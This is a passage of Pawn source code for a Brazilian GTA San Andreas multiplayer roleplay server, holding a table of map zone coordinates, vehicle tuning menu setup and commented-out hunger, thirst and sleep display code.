	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
	{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial",         {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"Four Dragons Casino",         {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	// Citys Zones
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

AntiMongoloideDeAMX()
{
    new a[][] =
    {
        "Unarmed (Fist)",
        "Brass K"
    };
    #pragma unused a
}

main()
{
	print("World Evolution");
	print("Brasil WE RPG [RPG] World Evolution");
}

stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:PointX, Float:PointY, Float:PointZ) return floatsqroot(floatadd(floatadd(floatpower(floatsub(X, PointX), 2.0), floatpower(floatsub(Y, PointY), 2.0)), floatpower(floatsub(Z, PointZ), 2.0)));

public OnGameModeInit()
{
	///tunar de mecanico
	TuningMenu = CreateMenu("TuningMenu",1,20,120,150,40);
    AddMenuItem(TuningMenu,0,"Paint Jobs");
    AddMenuItem(TuningMenu,0,"Cores");
    AddMenuItem(TuningMenu,0,"Exhausts");
    AddMenuItem(TuningMenu,0,"Front Bumper");
    AddMenuItem(TuningMenu,0,"Rear Bumper");
    AddMenuItem(TuningMenu,0,"Roof");
    AddMenuItem(TuningMenu,0,"Spoilers");
    AddMenuItem(TuningMenu,0,"Side Skirts");
    AddMenuItem(TuningMenu,0,"Bullbars");
    AddMenuItem(TuningMenu,0,"Wheels");
    AddMenuItem(TuningMenu,0,"Car Stereo");
    AddMenuItem(TuningMenu,0,"Proxima");
    Paintjobs = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Paintjobs,0,"PaintJobs");
	AddMenuItem(Paintjobs,0,"Paintjob 1");
	AddMenuItem(Paintjobs,0,"Paintjob 2");
	AddMenuItem(Paintjobs,0,"Paintjob 3");
	AddMenuItem(Paintjobs,0,"Paintjob 4");
	AddMenuItem(Paintjobs,0,"Paintjob 5");
	AddMenuItem(Paintjobs,0,"Menu");
	Colors = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Colors,0,"Cors");
	AddMenuItem(Colors,0,"Preto");
	AddMenuItem(Colors,0,"Branco");
	AddMenuItem(Colors,0,"Vermelho");
	AddMenuItem(Colors,0,"Azul");
	AddMenuItem(Colors,0,"Verde");
	AddMenuItem(Colors,0,"Amarelo");
	AddMenuItem(Colors,0,"Rosa");
	AddMenuItem(Colors,0,"Brown");
	AddMenuItem(Colors,0,"Proxima");
	Colors1 = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Colors1,0,"Colors");
    AddMenuItem(Colors1,0,"Grey");
	AddMenuItem(Colors1,0,"Gold");
	AddMenuItem(Colors1,0,"Dark Blue");
	AddMenuItem(Colors1,0,"Light Blue");
	AddMenuItem(Colors1,0,"Green");
	AddMenuItem(Colors1,0,"Light Grey");
	AddMenuItem(Colors1,0,"Dark Red");
	AddMenuItem(Colors1,0,"Dark Brown");
	AddMenuItem(Colors1,0,"Menu");
	Exhausts = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Exhausts,0,"Exhausts");
	AddMenuItem(Exhausts,0,"Wheel Arch Alien Exhaust");
	AddMenuItem(Exhausts,0,"Wheel Arch X-Flow Exhaust");
	AddMenuItem(Exhausts,0,"Loco Low-Co Chromer Exhaust");
	AddMenuItem(Exhausts,0,"Loco Low-Co Slamin Exhaust");
	AddMenuItem(Exhausts,0,"Menu");
	Frontbumper = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Frontbumper,0,"Frontbumpers");
	AddMenuItem(Frontbumper,0,"Wheel Arch Alien bumper");
	AddMenuItem(Frontbumper,0,"Wheel Arch X-Flow bumper");
	AddMenuItem(Frontbumper,0,"Loco Low-Co Chromer bumper");
	AddMenuItem(Frontbumper,0,"Loco Low-Co Slamin bumper");
	AddMenuItem(Frontbumper,0,"Menu");
	Rearbumper = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Rearbumper,0,"Rearbumpers");
	AddMenuItem(Rearbumper,0,"Wheel Arch Alien bumper");
	AddMenuItem(Rearbumper,0,"Wheel Arch X-Flow bumper");
	AddMenuItem(Rearbumper,0,"Loco Low-Co Chromer bumper");
	AddMenuItem(Rearbumper,0,"Loco Low-Co Slamin bumper");
	AddMenuItem(Rearbumper,0,"Main Menu");
	Roof = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Roof,0,"Roof");
	AddMenuItem(Roof,0,"Wheel Arch Alien Roof Vent");
	AddMenuItem(Roof,0,"Wheel Arch X-Flow Roof Vent");
	AddMenuItem(Roof,0,"Loco Low-Co Hardtop Roof");
	AddMenuItem(Roof,0,"Loco Low-Co Softtop Roof");
	AddMenuItem(Roof,0,"Main Menu");
	Spoilers = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Spoilers,0,"Spoliers");
	AddMenuItem(Spoilers,0,"Alien Spoiler");
	AddMenuItem(Spoilers,0,"X-Flow Spoiler");
	AddMenuItem(Spoilers,0,"Menu");
	Sideskirts = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Sideskirts,0,"SideSkirts");
	AddMenuItem(Sideskirts,0,"Wheel Arch Alien Side Skirts");
	AddMenuItem(Sideskirts,0,"Wheel Arch X-Flow Side Skirts");
    AddMenuItem(Sideskirts,0,"Loco Low-Co Chrome Strip");
    AddMenuItem(Sideskirts,0,"Loco Low-Co Chrome Flames");
    AddMenuItem(Sideskirts,0,"Loco Low-Co Chrome Arches");
    AddMenuItem(Sideskirts,0,"Loco Low-Co Chrome Trim");
    AddMenuItem(Sideskirts,0,"Loco Low-Co Wheelcovers");
	AddMenuItem(Sideskirts,0,"Main Menu");
	Bullbars = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Bullbars,0,"Bullbars");
	AddMenuItem(Bullbars,0,"Loco Low-Co Chrome Grill");
	AddMenuItem(Bullbars,0,"Loco Low-Co Chrome Bars");
	AddMenuItem(Bullbars,0,"Loco Low-Co Chrome Lights");
	AddMenuItem(Bullbars,0,"Loco Low-Co Chrome Bullbar");
	AddMenuItem(Bullbars,0,"Main Menu");
	Wheels = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Wheels,0,"Wheels");
	AddMenuItem(Wheels,0,"Offroad");
	AddMenuItem(Wheels,0,"Mega");
	AddMenuItem(Wheels,0,"Wires");
	AddMenuItem(Wheels,0,"Twist");
	AddMenuItem(Wheels,0,"Grove");
	AddMenuItem(Wheels,0,"Import");
	AddMenuItem(Wheels,0,"Atomic");
	AddMenuItem(Wheels,0,"Ahab");
	AddMenuItem(Wheels,0,"Virtual");
	AddMenuItem(Wheels,0,"Access");
	AddMenuItem(Wheels,0,"Next Page");
	AddMenuItem(Wheels,0,"Main Menu");
	Wheels1 = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Wheels1,0,"Wheels");
	AddMenuItem(Wheels1,0,"Trance");
	AddMenuItem(Wheels1,0,"Shadow");
	AddMenuItem(Wheels1,0,"Rimshine");
	AddMenuItem(Wheels1,0,"Classic");
	AddMenuItem(Wheels1,0,"Cutter");
	AddMenuItem(Wheels1,0,"Switch");
	AddMenuItem(Wheels1,0,"Dollar");
	AddMenuItem(Wheels1,0,"Menu");
	Carstereo = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Carstereo,0,"Stereo");
	AddMenuItem(Carstereo,0,"Bass Boost");
	AddMenuItem(Carstereo,0,"Menu");

 	TuningMenu1= CreateMenu("TuningMenu",1,20,120,150,40);
    AddMenuItem(TuningMenu1,0,"Hydraulics");
    AddMenuItem(TuningMenu1,0,"Nitro");
    AddMenuItem(TuningMenu1,0,"Repair Car");
    AddMenuItem(TuningMenu1,0,"Menu");
	Hydraulics = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Hydraulics,0,"Hydraulics");
	AddMenuItem(Hydraulics,0,"Hydraulics");
	AddMenuItem(Hydraulics,0,"Menu");
	Nitro = CreateMenu("TuningMenu",1,20,120,150,40);
	SetMenuColumnHeader(Nitro,0,"Nitro");
	AddMenuItem(Nitro,0,"2x Nitrous");
	AddMenuItem(Nitro,0,"5x Nitrous");
	AddMenuItem(Nitro,0,"10x Nitrous");
	AddMenuItem(Nitro,0,"Menu");

	//Basquete
	Baller = 999;
	DestroyObject(Ball);
	Ball = CreateObject(2114, 2782.3027,-2019.0826,13.5547-0.8,0,0, 96);
	//
    bRoubado = false;
	CofreAberto = false;
	SetTimer("AbrirCelas",2700000,false);
//---------------------------- FomeSedeSono ------------------------------------
	BS10 = CPS_AddCheckpoint(376.5635,-67.8318,1001.5151, 2.0, 10);
	RBD17 = CPS_AddCheckpoint(379.60001, -190.39999, 1000.3, 2.0, 10);
	CB9 = CPS_AddCheckpoint(369.89999, -6.2, 1001.4, 2.0, 10);
	WSP5 = CPS_AddCheckpoint(375.79999, -119.2, 1000.8, 2.0, 10);
	JD4 = CPS_AddCheckpoint(446.79999, -84.2, 999.59998, 2.0, 10);
	ZEU = CPS_AddCheckpoint(2217.3391, -1146.4551, 1025.7969, 2.0, 15);
//------------------------------------------------------------------------------
	/*barfome = CreateProgressBar(549.000000, 304.000000, 60.50, 3.70, 0xFF0033AA, 100.0);
	barsede = CreateProgressBar(549.000000, 335.000000, 60.50, 3.70, 0x03FF35FF, 100.0);
	barsono = CreateProgressBar(549.000000, 369.000000, 60.50, 3.70, 0x058AFFFF, 100.0);*/
	/*barfome = CreateProgressBar(519.00, 129.00, 86.50, 5.19, 0xFF8C00FF, 100.0);
	barsede = CreateProgressBar(519.00, 146.00, 86.50, 5.19, 0x0D85B5FF, 100.0);
	barsono = CreateProgressBar(519.00, 163.00, 86.50, 5.19, 0xDCDCDCFF, 100.0);*/
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
	/*TextFome = TextDrawCreate(558.000000, 282.000000, "Fome");
	TextSede = TextDrawCreate(558.000000, 315.000000, "Sede");
	TextSono = TextDrawCreate(558.000000, 347.000000, "Sono");
//------------------------------------------------------------------------------
	TextDrawFont(TextFome, 0);
	TextDrawFont(TextSede, 0);
	TextDrawFont(TextSono, 0);
//------------------------------------------------------------------------------
	TextDrawLetterSize(TextFome, 0.559999, 1.700000);
	TextDrawLetterSize(TextSede, 0.559999, 1.700000);
	TextDrawLetterSize(TextSono, 0.559999, 1.700000);
//------------------------------------------------------------------------------
	TextDrawSetShadow(TextFome,0);
	TextDrawSetShadow(TextSede,0);
	TextDrawSetShadow(TextSono,0);
//------------------------------------------------------------------------------
    TextDrawAlignment(TextFome, 1);
    TextDrawAlignment(TextSede, 1);
    TextDrawAlignment(TextSono, 1);
//------------------------------------------------------------------------------
	TextDrawSetProportional(TextSono, 1);
	TextDrawSetProportional(TextFome, 1);
	TextDrawSetProportional(TextSede, 1);
//------------------------------------------------------------------------------
	TextDrawSetOutline(TextFome, 1);
	TextDrawSetOutline(TextSono, 1);
	TextDrawSetOutline(TextSede, 1);*/
	/*FSSBox[0] = TextDrawCreate(612.000000, 126.000000, "_");
	TextDrawBackgroundColor(FSSBox[0], 255);
	TextDrawFont(FSSBox[0], 1);
	TextDrawLetterSize(FSSBox[0], 0.500000, 1.100000);
	TextDrawColor(FSSBox[0], -1);
	TextDrawSetOutline(FSSBox[0], 0);
	TextDrawSetProportional(FSSBox[0], 1);
	TextDrawSetShadow(FSSBox[0], 1);
	TextDrawUseBox(FSSBox[0], 1);
	TextDrawBoxColor(FSSBox[0], 85);
	TextDrawTextSize(FSSBox[0], 496.000000, 28.000000);
	TextDrawSetSelectable(FSSBox[0], 0);

	FSSBox[1] = TextDrawCreate(612.000000, 143.000000, "_");
	TextDrawBackgroundColor(FSSBox[1], 255);
	TextDrawFont(FSSBox[1], 1);
	TextDrawLetterSize(FSSBox[1], 0.500000, 1.100000);
	TextDrawColor(FSSBox[1], -1);
	TextDrawSetOutline(FSSBox[1], 0);
	TextDrawSetProportional(FSSBox[1], 1);
	TextDrawSetShadow(FSSBox[1], 1);
	TextDrawUseBox(FSSBox[1], 1);
	TextDrawBoxColor(FSSBox[1], 85);
	TextDrawTextSize(FSSBox[1], 496.000000, 28.000000);
